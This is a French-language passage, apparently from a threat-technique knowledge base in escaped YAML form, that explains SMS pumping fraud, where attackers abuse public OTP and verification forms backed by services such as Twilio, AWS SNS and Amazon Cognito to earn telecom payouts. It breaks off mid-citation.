          \ Le pompage de SMS est un type de fraude dans le domaine des t\xE9l\xE9\
          communications par lequel un auteur de menace obtient d\u2019abord un ensemble\
          \ de num\xE9ros de t\xE9l\xE9phone d\u2019un fournisseur de services de\
          \ t\xE9l\xE9communications, puis exploite l\u2019infrastructure de messagerie\
          \ d\u2019une victime pour envoyer de grandes quantit\xE9s de messages SMS\
          \ \xE0 des num\xE9ros de cet ensemble. En g\xE9n\xE9rant du trafic SMS vers\
          \ son num\xE9ro de t\xE9l\xE9phone d\xE9fini, un auteur de menace peut gagner\
          \ des paiements de la part du fournisseur de t\xE9l\xE9communications. (Citation\
          \ : Fraude au pompage de SMS Twilio)\n\nLes auteurs de menace utilisent\
          \ souvent des formulaires Web accessibles au public, tels que des mots de\
          \ passe \xE0 usage unique (OTP) ou des champs de v\xE9rification de compte,\
          \ afin de g\xE9n\xE9rer du trafic SMS. Ces champs peuvent exploiter des\
          \ services tels que Twilio, AWS SNS et Amazon Cognito en arri\xE8re-plan.\
          \ (Citation : Twilio SMS Pumping)(R\xE9f\xE9rence : AWS RE\_:Inforce Threat\
